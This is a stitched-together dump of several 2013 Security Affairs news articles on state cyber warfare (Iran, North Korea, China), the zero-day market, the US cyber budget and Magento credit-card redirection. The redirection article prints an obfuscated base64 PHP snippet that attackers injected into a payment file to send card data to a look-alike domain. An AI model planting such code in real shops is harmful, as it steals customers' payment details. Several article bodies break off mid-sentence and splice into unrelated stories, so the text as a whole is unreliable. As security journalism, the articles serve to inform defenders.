The news doesn\u2019t surprise the cybersecurity experts that know very well how much is vulnerable the country to a cyber attack, we are discussing of Information Warfare for a long time and many intelligence reports demonstrated that cyber terrorists and state sponsored hackers could hit critical infrastructure using malicious code and tools available on the internet and purchased in the underground. A new study sustains that despite the Iranian cyber capabilities are considered modest, they could be sufficient to launch attacks against the U.S. that would do more damage to public perceptions than actual infrastructure.\n\nThe study titled \u201cIran: How a Third Tier Cyber Power Can Still Threaten the United States\u201d was published by the Atlantic Council, a NATO organization based in Washington, it highlights that a cyber attack could be used for destructive purposes and to cause serious damage to the targeted country.\n\nThe Atlantic Council\u2019s Iran Task Force and its Cyber Statecraft Initiative worked together on the analysis conducted to evaluate cyber warfare options available to the Iranian Government in case of cyber warfare against the US.\n\nThis new perspective is different from what is happening in the past when cyber attacks have only triggered a political crisis. The most popular cyber attack is the past on nation-states was the Russian one against Estonia in 2007 that \u201ccaused a political crisis, not a military one,\u201d\n\n\u201ca significant Iranian cyberattack against the United States would take on outsized importance, regardless of its technical sophistication.\u201d \u201cIran does not need the equivalent of a Ferrari to inflict damage on U.S. infrastructure: A Fiat may do \u201dstates the study.\n\nA cyber offensive could be ideal for the Iranian Government, it could hit the adversary denying any responsibility, another option could be the hiring of cyber mercenary groups located in Russia or Lebanon.\n\nLet\u2019s imagine the effect of a cyber attack against the New York Stock Exchange or the effects of a blackout on the large-scale caused by a cyber attack against national electric grids, public perceptions could have a devastating impact.\n\nIt\u2019s not a mystery that Iranian state-sponsored hackers already hit the US in the past, in particular, US intelligence believes that they are responsible for the wave of cyberattacks that hit US major banks with powerful DDoS attacks.\n\nThe study considers US, Russia, and some Western nations as \u201ctier one\u201d cyber powers, putting China \u201ca step behind them\u201d at \u201ctier two,\u201d and Iran, which only recently has begun to develop an online warfare capability, is a \u201cthird tier\u201d power.\n\nPersonally I consider this view optimistic, China has in my opinion a great cyber capability and respect other countries is investing much more in the development of new cyber weapons. Consider also that China is historically considered the most active country in cyber espionage, an activity that already given to Government of Beijing a great advantage over its competitors.\n\nThe report compares the growth of Iranian cyber capabilities to the North Korean menace that has caused serious damage to South Korean infrastructure recently.\n\n\u201cThere is no reason to believe that Iran\u2019s growing cyber army is any less capable than that of an isolated Asian rogue state with few IT graduates, limited Internet access, and a paucity of computers,\u201d the study states.\n\nWhat to expect in the future?\n\n\u201cWhile the cyber conflict may escalate, it is unlikely that there will be an overt cyber war anytime soon between the United States and Iran. So far, there have been campaigns of relatively limited aims on both sides, and with a new president just elected in Iran who is promising \u201cconstructive \nengagement\u201d with the United States, open and more aggressive campaigns are unlikely in the near future. A continuation of covert irregular conflict, however, with involvement by the Revolutionary Guards and associated militias and proxies, is certainly possible. The Guards report to the hard-line clerical establishment, led by Khamenei, who remains in charge of Iranian defense and foreign policy.\u201d\n\nIt\u2019s my personal opinion that cyberspace could be explored by any government in the same way, consider one state more advanced of another is a serious error, everybody is investing in the development of news cyber capabilities and until the cyber strategy of any countries will not secure internal infrastructure everyone is exposed to the effect of a cyber attack, US included, and everyone could choose the cyber option to hit a company or a government.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Iran, Cyber warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastuctures", "topic_name": "critical infrastuctures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Credit Card Redirection, the evolution of phishing", "news_link": "https://securityaffairs.co/wordpress/16777/security/credit-card-redirection-the-evolution-of-phishing.html", "title": "Credit Card Redirection, the evolution of phishing\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 30, 2013", "body": "With the term credit card redirection is indicated the illegal practice to steal credit and debit card information compromising legitimate web services.

The redirection is possible also modifying the credit card processing file giving to the criminals the access to all the transaction data including credit card details (name, address, CC and CVV).\n\n\u201cThe attackers modify the flow of the payment process so that instead of just processing the card, they redirect all payment details to a domain they own so they can steal the card details.\u201d\n\nThe phishing site was usually well crafted adopting also a valid SSL certificate to reassure the users, Credit Card Redirection is considered an evolution of phishing.\n\nWebsites implementing e-commerce service are under attack, in particular those ones using open source e-commerce system Magento.\n\n\n\nFor the popular e-commerce platform has been observed in one case that the file used for payment handling is altered to replace every occurrence of paymentexpress.com for paymentiexpress.com, that is resulted as a domain managed by cyber criminals.\n\nThe domains are registered few weeks before the attacks until they are blacklisted.\n\nDaniel Cid, Chief Technology Officer at Sucuri, described the technique in a blog post.\n\n\u201cInstead of tricking users into clicking into a bad URL, [malicious code] tricks the site itself to redirect the users information there,\u201d\n\nBecause of the nature of Magento websites, they are a big target.

In this specific case, the file \u201capp/code/community/MageBase/DpsPaymentExpress/Model/Method/Pxpay.php\u201d (use for PaymentExpress payment handling) was modified with this code:\n\n$oo = base64_decode(\u2018cGF5bWVudGV4cHJlc3M=\u2019); $_oo = base64_decode(\u201ccGF5bWVudGlleHByZXNz\u2019);$_is = base64_decode(\u201cc2Vzc19pZA==\u2019);\n$_oi = base64_decode(\u201ccHJlZ19yZXBsYWNl\u2019);\n$responseURI = $_oi(\u2018/\u2019.$oo.\u2019/\u2019,$_oo,strval($responseXml->URI));\n\nWhich once decoded, replaces every occurrence of paymentexpress for paymentiexpress (see extra i).

Despite it is not clear the exact amount of information stolen, neither the exact networks penetrated by attackers, South Korean Government blamed North Korean state sponsored-hackers.\n\n\n\nResearchers highlighted that there are various clues in the malicious code which lead to the North Korea, for example the password used to unlock encrypted files contains the number 38 probably linked to \u201c38th parallel\u201d that separates the North from South Korea.\n\nSherstobitoff started the investigation after the malware based attacks occurred on March 20th, known as the Dark Seoul Incident, in which tens of thousands of hard drives belonging to television networks and banks in South Korea were wiped.\n\n\u201cThis goes deeper than anyone had understood to date, and it\u2019s not just attacks: It\u2019s military espionage,\u201d Sherstobitoff said\n\nMcAfee researchers said that the malware used to wipe the disks during the recent attacks is different from the malicious code used for the cyber espionage campaign, but the presence of many similarities between the two codes led to believe they must be created by the same developers.\n\nOn the Internet circulated the name of two distinct groups of hackers that claimed responsibility for the attacks, The \u201cWhois Hacking Team\u201d that posted pictures of skulls and a warning and the \u201cNewRomanic Cyber Army Team\u201d that announced it had leaked private information from Korean media and banking.\n\nAnother element of interest is that the hackers behind the attacks have spread their spyware on domestic networks for months with specific intent to gather information on national cyber infrastructure and on the habit of Korean Internet users, data that could advantage successive attacks.\n\nWhat is interesting is that the South Korean cybersecurity researcher, Simon Choi, found instances of the malware dated early 2007, they were equipped with keyword-searching capabilities added in 2008 and for sure the same hackers were involved in cyber attacks launched in the past years against South Korea.\n\n\n\nChoi, who works for a South Korean cybersecurity company, has conducted an investigation with  researchers at IssueMakersLab, issued in the last months a report that revealed many search terms used by malware and that were not included in the McAfee report, including the English-language equivalents of Korean keywords.\n\nSherstobitoff hypothesized that same code it is still operating to gain confidential information from South Korean, the researcher sustains that malware fingerprints were found on the anniversary of the start of the 1950-53 Korean War occurred on June 25th, when government websites including South Korea\u2019s president and prime minister portal were attacked.\n\nOn June 26th the US Government announced that personal information about thousands of U.S. troops in South Korea had been exposed online.\n\nThe attackers infected victims with \u201cspear phishing\u201d attacks, the hackers also compromised about a dozen Korean-language religious, social and shopping websites to steal secret info from victims being undetected.\n\nThe attackers have targeted government networks managing military information for at least four years, they used malicious code that automatically searched for military terms in Korean, including \u201cU.S. Army,\u201d \u2018\u2019secret,\u201d \u2018\u2019Joint Chiefs of Staff\u201d and \u201cOperation Key Resolve,\u201d.\n\n \u201cThese included names of individuals, base locations, weapons systems and assets,\u201d revealed Sherstobitoff.\n\nSouth Korea\u2019s Defense Ministry announced that it\u2019s technically impossible to disclose classified reports from military networks because the networks of the Korean Intelligence  aren\u2019t connected to the Internet and that access to the Internet is made with different computers separated by the internal military infrastructure.\n\n\n\nA hack of sensitive South Korean military computers from the Internet \u201ccannot be done,\u201d \u201cIt\u2019s physically separated.\u201d said the South Korean government representative.\n\nKwon Seok-chul, chief executive officer of Seoul-based cyber security firm Cuvepia Inc., said that hackers may have the skills to penetrate into the internal networks of Korean and U.S. Military even if they are separated from the internet.\n\n\u201cIt takes time, but if you find the connection, you can still get into the internal server,\u201d Kwon said.\n\nDespite a limited portion of the North Korean population has access to the Internet it must be considered that the country has the highest percentage of military personnel in relation to population than any other nation in the world.

Let\u2019s remind that access to Internet from Iran is controlled by the regime and it is quite impossible to elude the surveillance to conduct a series of attacks against a foreign state.\n\nUS Government was considered by Iran an enemy to fight and in various occasions the Iranian authorities blamed US and Israel for the destructive cyber attacks based on Stuxnet virus against the Natanz nuclear enrichment plant.\n\nTo respond to continuous attacks against its infrastructures from foreign governments the President Mahmud Ahmadinejad personally promoted the born of a high specialized cyber unit named Iran\u2019s Islamic Revolutionary Guards Corps.\n\n\n\nImmediate the official reply of the Iranian government, it denied that responsibility for the cyber attacks from Iran and in turn increased the allegations against the U.S. Government guilty of continuing attacks on facilities in the country.\n\nAccording The Times its editor received a letter referring a May 12 article that reported on the new attacks\u2019 similar to the Saudi Aramco episode, Alireza Miryousefi, the head of the press office of the Iranian mission to the United Nations, wrote that\n\n[Iran] \u201cnever engaged in such attacks against its Persian Gulf neighbors, with which Iran has maintained good neighborly relations.\u201d\n\n\u201cUnfortunately, wrongful acts such as authorizing the 2010 Stuxnet attack against Iran have set a bad, and dangerous, precedent in breach of certain principles of international law,\u201d he wrote.\n\nUS ICS-Cert, an agency that monitors cyber attacks against industrial SCADA and ICS issued various warnings on the cyber threats expressing high concern for possible consequences of a successful attack.\n\nFormer Defense Secretary Leon Panetta last year has alerted US government on the high risks of cyber attacks against U.S. critical infrastructures and network, sustaining that attackers are increasing their cyber capabilities.\n\nHe defined the actual historical period as a \u201cpre-9/11 moment,\u201d referring to a possible series of cyber attacks against US. Panetta revealed that U.S. Intelligence community fears a combined threat of cyber terrorism and other attacks that could have effect similar to 9/11.\n\nThe possible targets of a cyber attacks are multiple, from nuclear plants to telecommunications systems and the U.S., such as many other countries are still too vulnerable.\n\n\u201cThe attackers are plotting. Our systems will never be impenetrable, just like our physical defenses are not perfect. But more can be done to improve them.  We need Congress, and we need all of you, to help in that effort.\u201d said Panetta.\n\nForeign governments are conducting numerous offensives also against other strategic sectors, US major banks for example have been targeted by numerous DDoS attacks in the recent months and according security experts it was always a series of cyber attacks from Iran.\n\nThe New York Times reported in a post:\n\nGovernment officials also say Iran was the source of a separate continuing campaign of attacks on American financial institutions that began last September and has since taken dozens of American banks intermittently offline, costing millions of dollars. But that attack was a less sophisticated \u201cdenial of service\u201d effort.\n\nThese attacks, their increased complexity and frequency urge the adoption of an efficient cyber security strategy shared by government, private enterprises and the population \u2026 cyber security is a share responsibity.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber security)\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/qatari-energy-compan", "topic_name": "Qatari energy compan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rasgas", "topic_name": "RasGas"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/saudi-aramco", "topic_name": "Saudi Aramco"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Zero-day market, the governments are the main buyers", "news_link": "https://securityaffairs.co/wordpress/14561/malware/zero-day-market-governments-main-buyers.html", "title": "Zero-day market, the governments are the main buyers\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 21, 2013", "body": "Zero-days exploits are considered a primary ingredient for success of a cyber attack, the knowledge of zero-day flaw gives to the attacker guarantee of success, state-sponsored hackers and cyber criminals consider zero-day exploits a precious resources around which is grown a booming market.\n\nZero-day exploits could be used to as an essential component for the design of a cyber weapon or could be exploited for cyber espionage purposes, in both cases governments appear the most interested entities for the use of these malicious code.\n\nRecent cyber attacks conducted by Chinese hackers might lead us to think Chinese Government is primary buyer/developer for zero-day vulnerabilities, but a report recently published by Reuters claimed the US government is the \u201cbiggest buyer in a burgeoning gray market where hackers and security firms sell tools for breaking into computers.\u201d\n\nReuters revealed that the US Government, in particular its intelligence agency and the DoD are \u201cspending so heavily for information on holes in commercial computer systems, and on exploits taking advantage of them, that they are turning the world of security research on its head.\u201d, it\u2019s a news way to compete with adversary in cyberspace.\n\nRecent tension between China and US gave security experts the opportunity to discuss about the development of the two countries of efficient cyber strategy that improve both offensive and defensive cyber capabilities.\n\nBoth countries are largely invested in the creation of new cyber units, but according intelligence sources, offensive approach seems to be most stimulated by the need to preserve the security in the cyberspace.\n\nNSA chief General Keith Alexander told Congress that the US Government  is spending billions of dollars every year on \u201ccyberdefense and constructing increasingly sophisticated cyberweapons\u201d this led to the birth  of \u201cmore than a dozen offensive cyber units, designed to mount attacks, when necessary, at foreign computer networks.\u201d\n\nPopular hacker Charlie Miller, security researcher at Twitter, with a past collaboration with NSA confirmed the offensive approach to cyber security:\n\n \u201cThe only people paying are on the offensive side,\u201d\n\nThe emerging zero-day market is fueled by intense activities of talented hackers who sell information on flaws in large use products. According Reuters defense contractors and intelligence agencies \u201cspend at least tens of millions of dollars a year just on exploits\u201d.\n\nThe zero-day market is very complex due high \u201cperishability\u201d of the goods, following some key figures of a so complex business\n\nDif\ufb01culty \ufb01nding buyers and sellers \u2013 It\u2019s a closed market not openly accessible. Find a buyer or identify a possible seller is a critical phase.\n\nChecking the buyer reliability \u2013 The reduced number of reliable brokers able to locate a buyer pushes the researcher to try to tell many individuals about the discovery in an attempt to \ufb01nd a buyer with obvious risks.\n\nValue cannot be demonstrated without loss \u2013 One of the most fascinating problems a researcher attempting to sell vulnerability information or a 0-day exploit may face is proving the validity of the information without disclosing the information itself. The only way to prove the validity of the information is to either reveal it or demonstrate it in some fashion. Obviously, revealing the information before the sale is undesirable as it leaves the researcher exposed to losing the intellectual property of the information without compensation.\n\nExclusivity of rights \u2013 The \ufb01nal hurdle involves the idea of the exclusive rights of the information. In order to receive the largest payoffs, the researcher must be willing to sell all rights to the information to the buyer. However, the buyer has no way to protect themselves from the researcher selling the information to numerous parties, or even disclosing the information publicly, after the sale.\n\nCurrent approaches to zero-day vulnerabilities are to be bought up exploits avoiding that they could be acquired by government\u2019s opponents such as dictators or organized criminals, many security firms sell subscriptions for exploits, guaranteeing a certain number per year.\n\nThe trend to exploit zero-day for offensive purposes has been followed by intelligence agencies and also private companies, both actors have started to code their own zero-day exploits.\n\n\u201cPrivate companies have also sprung up that hire programmers to do the grunt work of identifying vulnerabilities and then writing exploit code. The starting rate for a zero-day is around $50,000, some buyers said, with the price depending on such factors as how widely installed the targeted software is and how long the zero-day is expected to remain exclusive.\u201d\n\nThe Reuters report also revealed the participation of government representatives to the Secret Snoop Conference for Government and law enforcement spying, clearly with the intent to acquire new technologies to conduct cyber espionage through malware based attacks able to compromise target  networks.\n\nThe choice of a government to acquire a zero-day exploit to use it against a foreign governments hide serious risks for its country, cyber terrorist, cyber criminals or state-sponsored hackers could  reverse engineer the source code to compose new malicious agent to use against the same authors.\n\nThe most popular example is the case of Duqu malware, a powerful spyware designed \u201cto steal industrial-facility designs from Iran.\u201d  which code was adopted by cybercrime industry to be the active components in popular Blackhole and Cool exploit kits.\n\nIn many cases the efficiency of these zero-day exploits has a long life due the presence of not updated target systems, typical zero-day attack has an average duration of 312 days and once publicly disclosed it is observable an increases of 5 orders of magnitude of the volume of attacks.\n\n\n\nReuters reported to have reviewed a product catalogue from one large contractor, it contained various applications for cyber espionage purposes. The article refer of a product \u201cto turn any iPhone into a room-wide eavesdropping device\u201d and another one \u201cwas a system for installing spyware on a printer or other device and moving that malware to a nearby computer via radio waves, even when the machines aren\u2019t connected to anything.\n\nThe product portfolio is very wide including tools for getting access to computers or phones and tools for grabbing different categories of data, it\u2019s clear that majority of these products exploits zero-day vulnerabilities on various application and OSs \u2026. most of the programs cost more than $100,000.\n\nBased from my experience the cost of a zero day-day depends on a multitude of factors such as the product target, its diffusion level and of course the scope of use, a zero-day sold to a government could have a price up to 100 times an exploit kit sold to private industry.\n\nWhich are the principal mediators for zero-day sale?\n\nThe Grugq is the famous one but also small firms like Vupen and Netragard and other defense contractors such as Northrop Grumman operate this growing market.\n\nNetragard\u2019s founder Adriel Desautels says he\u2019s been in the exploit-selling game for a decade, and describes how the market has \u201cexploded\u201d in just the last year.  He says there are now \u201cmore buyers, deeper pockets,\u201d that the time for a purchase has accelerated from months to weeks, and he\u2019s being approached by sellers with around 12 to 14 zero-day exploits every month compared to just four to six a few years ago.\n\nPrepare for the worst, the explosion in demand for zero-day leaves little doubt about the true intentions of governments and the impact is certainly not confined to just cyberspace.\n\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber security, Zero-day vulnerabilities)\n\n", "topics": [{"topic_link":

is originated from China.\n\nThe Pentagon\u2019s annual report to Congress recently released is the first government document that explicitly accuses People\u2019s Liberation Army (PLA) for organizing a campaign of attacks to gain a strategic technological advantage over the United States.\n\n\n\n\u201cIn 2012, numerous computer systems around the world, including those owned by the U.S.

expects \u201cU.S. arms manufacturers are gearing up to start counting their money\u201d.\n\nThe two governments are focusing the confrontation in cyberspace, both states understood the potential of the cyber tools for espionage and sabotage, and both governments continue to provide direct support and investment to support research on new technologies to compromise adversary\u2019s networks.\n\nThe Chinese Government has expressed in the past great concerns on the attacks that are targeting its network and that result originated from West.\n\nXinhua agency revealed that China\u2019s Internet security watchdog detected from September 2012 to February 2013 various attacks against national cyber assets, 85 government websites and high-profile private companies suffered serious offensive.\n\nChinese authorities are concerned regarding the pressure of attacks originated from West, 46% of the incursions were traced back to the United States based, also in this case it is impossible to establish a precise responsibility of Washington.\n\nSurprising the number of overseas Internet Protocol (IP) addresses originating the attacks, CNCERT (National Computer Network Emergency Response Technical Team Coordination Center) identified in 2012 73,000 different addresses involved in hijacking nearly 14.2 million mainframes in China via Trojan or Botnet.\n\nThe majority of malware based attacks is originated in the US, the attackers gathered unauthorized access to 16,388 web pages in China, the percentage of government websites is 11% in 2012, up 6.1 percent respect previous year.\n\nThe People\u2019s Daily has weighed the allegations against the US proposing a declaration of spokesman of the Chinese Communist Party;\n\n\u201cAs we all know, the United States is

information, company secrets and intellectual property, continuous cyber espionage campaigns targeted foreign companies and government agencies all around the world.\n\nVerizon reported 44 million  of compromised records from 621 confirmed data breaches, of which 19 percent were the result of government-affiliated espionage, the attacks mainly hit financial organization (37%) and retail environments and restaurants (24%).\n\nChinese hackers targeted product sectors of any government  such transportation, manufacturing and professional services companies, independently from their dimensions.\n\n\n\n\u201cA definite relationship exists between industry and attack motive, which is most likely a byproduct of the data targeted (e.g., stealing payment cards from retailers and intellectual property [IP] from manufacturers).\u201d\n\nAlmost the totality of attacks is attributable to outsiders as shown in the following picture:\n\n\n\nChina isn\u2019t the unique country responsible of large scale espionage campaigns, other countries such as Russia, Israel and France, also conduct similar operations but not at the scale attempted by Chinese cyber units.\n\nWithin profit-minded hackers most active groups are often based in the United States , Romania, Bulgaria or Russia and their primary purpose is the collection of Payment cards, credentials and Banking account info. State-affiliated actors demonstrated great interest in other data such as Credentials, Internal organization data, Trade secrets and System info and adopted a wide range of attacks from malware based offensive to phishing campaign.\n\n\n\nShawn Henry, former head of cyber security investigations for the FBI who is president of security firm CrowdStrike Services declared;\n\n\u201cIt\u2019s not China alone. Dozens of other countries are involved,\u201d\n\nAlthough cybercriminals are the most common source of data breaches worldwide, Chinese state-sponsored campaigns monopolize the attacks having the purpose of cyber-espionage of intellectual property targeting government representatives of foreign governments.\n\nThe figures are shocking and leave no space for free interpretation, for a total of 120 incidents of government cyber-espionage detailed in the report Chinese hackers is responsible for  96 % of the attacks meanwhile isn\u2019t known the source of remaining data breaches.\n\nHow do breaches occur?\n\nAccording the Data Breach Investigations Report 76% of network intrusions exploited weak or stolen credentials, 52% used some form of hacking and 40% of incidents is related to malware.\n\nDespite the evidences confirm the Chinese origin of the cyber espionage campaigns the government of Beijing has always denied any allegations .\n\nAccording the Data Breach Investigations Report the large number of operations conducted by Chinese Government made possible the identification of a common pattern, Chinese hackers adopted a common strategy in every attack.\n\nBut it\u2019s not simple to discover the real origin of attacks, attackers could hide their location in various ways so Verizon officials before to publish the report collected a huge quantity of evidences that linked the cyber espionage campaigns to China.\n\nThe report proposes many other interesting information of recent events, it also includes a list of 20 Critical Security Controls recommended to mitigate the growth of cyber threat \u2026 \n\nWhat are you waiting to read it?\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Security)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breach", "topic_name": "data breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/profit-minded-hackers", "topic_name": "profit-minded hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/verizon", "topic_name": "Verizon"}]}, {"news_name": "US army discloses budget for cyber operations", "news_link": "https://securityaffairs.co/wordpress/13734/cyber-warfare-2/us-army-discloses-budget-for-cyber-operations.html", "title": "US army discloses budget for cyber operations\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 21, 2013", "body": "It\u2019s not a mystery, every state despite the spending review on the military budget is continuing to reserve consistent investment in cyber security, in particular majority of states is pushing research and development activities on both defense and offense cyber capabilities.\n\nUS is one of the most advanced country in cyber warfare, the US Government was one of the first to recognize the importance of operations in the cyberspace and the necessity to consider it as the fifth domain of warfare.\n\nSince now the estimations on US expenses in cyber operations were estimates of the leading experts in the field but for the first time The Pentagon has detailed $30 million in spending on Air Force cyber attack operations and new Army funding.\n\nWith the public disclosure of the budget for cyber operations US, in particular the Defense Department, desires to provide to national taxpayer\u2019s evidence of effort spent in what is being considered a critical component of the modern military.\n\nThe public opinion is dedicating even more wide space to news related cyber security and to the risks related to a cyber attack against critical infrastructures of a country, the government with the announcement desire to inform his population on its network assault programs and of course to launch a warning to those who intend to attack the country from cyber space.\n\nThe Pentagon revealed the intent to constitute and fund new staff dedicated to offensive cyber operations for the  exploitation of opponent networks and infrastructures.\n\nThis week is circulated the document titled \u201cFiscal Year (FY) 2014 Budget Estimates \u2013 OPERATION AND MAINTENANCE, AIR FORCE\u201d to explain how US intends to invest the money, lets\u2019 go to analyze in detail the amount of money reserved by the US Administration.\n\nThe Air Force in fiscal 2014 will reserve $19.7 million on \u201coffensive cyber operations,\u201d the expense will support operative cyber operations, personnel training and research and development activities.  In cyber warfare scenario a crucial role is played by cyber tools used to exploit opponent\u2019s structures so US estimate needing $9.8 million for development of new cyber tools to use in cyber operations.\n\nThe Pentagon proposed also the hiring of new personnel, 65 units, to dedicate to the cyber missions, the mission assigned to Cyber Command is critical because it is responsible to deflect incoming assaults from cyber space against critical infrastructures of the country.\n\nOf course part of the funds will be dedicated to Defense Cyber Operations to protect data and infrastructures of the country from cyber attacks, sabotage and cyber espionage.\n\nFollowing a portion of the \u201cSummary of funding Increases and Decreases\u201d related to the \u201ccyber commitment\u201d:\n\nTransfers In\n\n\n\nTransfers Out\n\n \n\n\n\nNextgov portal reported the US government chose to divulge this information \u201cbecause cyber offense will be a standard line item from now on and the public needs to understand what it is paying for.\u201d\n\nTo those taxpayers that as justification for the investments in cyberspace while defense budget is under cutting Air Force spokesman Maj. Eric Badger replied:\n\n\u201cWe are committed to maintaining the right balance of integrated cyber capabilities and forces that are organized, equipped and trained to successfully conduct operations in cyberspace. We\u2019re equally as committed to doing so in a way that\u2019s respectful of the taxpayers\u2019 dollar,\u201d\n\n\u201cWe know the Air Force\u2019s capabilities in cyber are going to continue to be touchstones for the whole joint team, the whole of government and for the private sector,\u201d the official added.\n\nAccording Nextgov further $4.9 million will be dedicated to the development of \u201ccomputer network exploitation\u201d and \u201ccomputer network attack\u201d capabilities.\n\nOf course no shortage of controversy for military spending, analysts accused the government of excessive and duplicated hacking investments. Todd Harrison, senior fellow for defense budget studies at the Center for Strategic and Budgetary Assessments accuses the dispersion in cyber attack spending to fund different commands within US army:\n\n\u201cDo we really want each service going off and developing their own capabilities for these threats?\u201d questioned \u201cHow much redundancy are we building across the services in the areas of cyber? What is unique to the Army?\u201d \u201cMaybe it\u2019s time to give Cyber Command more budget authority,\u201d Harrison said.\n\nOther military experts said the services might be giving away these details to ward off potential foes on the Internet.\n\nI will not go into the merits of the distribution of spending and allocation of responsibilities for operations in cyberspace, but I believe that investment in cyber security is crucial for the cyber strategy of each country \u2026 Probably the funds allocated are still too small compared to the need for cyber security.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/military-budget", "topic_name": "military budget"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pentagon", "topic_name": "Pentagon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Anonymous  #OpIsrael, use of botnets & hypothesis on attackers", "news_link": "https://securityaffairs.co/wordpress/13664/cyber-crime/anonymous-opisrael-use-of-botnets-hypothesis-on-attackers.html", "title": "Anonymous  #OpIsrael, use of botnets & hypothesis on attackers\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 18, 2013", "body": "We all remember the debated attacks of Anonymous collective against Israeli government that targeted various websites of the country last April 7th.

Due this reason the government of Pyongyang decided to restart the nuclear reactor stopped in 2007.  Despite analysts believe that the regime\u2019s missile arsenal is not able to strike U.S bases in Guam or Hawaii they believe serious menaces could be brought from the cyberspace where North Korea is very active, is known in fact that North Korea has an elite of cyber units already made up of 3,000 hackers trained to cyber espionage and on offensive security.\n\nAndrea Berger, Research Fellow in nuclear analysis of the defense think tank Royal United Services Institute declared:\n\n\u201cIt is unlikely that North Korea would be technically capable of carrying out its threats of nuclear attack on the continental United States,\u201d\n\nTo avoid internal attacks North Korea recently cut off mobile internet access for visitors to the country, North Korean defector Kim Heung-Kwang claims that the government is training \u201ccyber warriors\u201d to attack Western targets receiving also support by Russia and China cyber groups.\n\nOver the border, South Korea\u2019s defense ministry announced Monday it would start preparing the national army for cyber warfare  in conjunction with the United States.\n\n\u201cWe will cooperate with the US to prepare measures in cyber policy, technology and information,\u201d\n\nRecent attacks have found South Korea vulnerable to cyber offensives and risks related to imminent new cyber attacks is high. In 2010 Government of Seoul established Cyber Command composed by 400 personnel and it is aware of the possible consequences of a cyber attack, South Government also menaced North Korean warning on a possible military retaliation in response to military provocation of the adversaries, meantime The Wall Street Journal revealed that the US flew F-22 stealth fighter jets to South Korea on Sunday for joint exercises. The Journal states:\n\n\u201cIn a conflict with North Korea, F-22s would likely be the first aircraft used. The hard-to-detect fighters could be sent in to take out air defense missiles and radars in advance of bombers aimed at missile launch sites or other targets. They also could be used to escort nuclear-capable B-2 stealth bombers, should these be used in a strike\u201d\n\nAt the same time to increase pressure in the area and discourage North Korea offensive the US Navy is moving a guided-missile destroyer USS Fitzgerald into the Pacific Ocean off the Korean Peninsula, the tension is very high and then the option \u201ccyber attack\u201d would be more appropriate in a context in which neither side wants to start serious hostilities \u2026 a cyber attack allows the attackers to remain hidden causing serious damage and paving the way for a successive military strike.\n\nIn this difficult scenario there is a third force not negligible, the hacktivism, independent groups of patriots who have high technical skills and take the initiative\u2019s offense against the hostile nation.\n\nRegarding last attacks against South Korea Kaspersky Labs experts declared:\n\n\u201cObviously, the attacks were designed to be \u2018loud\u2019 \u2013 the victims are broadcasting companies and banks. This makes us think we are not dealing with a serious, determined adversary but hacktivists looking for quick fame.\u201d \n\nRoel Schouwenberg, security researcher at Kaspersky Labs added:\n\n\u201cThe complete scope of last week\u2019s attacks hasn\u2019t yet been determined. The malware wasn\u2019t particularly complex, but the execution was well done, so it should just be a few people.\u201d\n\u201cConducting basic cyber-attacks isn\u2019t hard at all. So you could potentially be looking at a single motivated attacker who put in a lot of time. Having a bigger team of people would generally reduce the amount of time needed to prepare and execute an attack.\u201d \u201cGiven the state of cyber-security, a group of dedicated hacktivists can decide they want to attack a particular company or vertical and 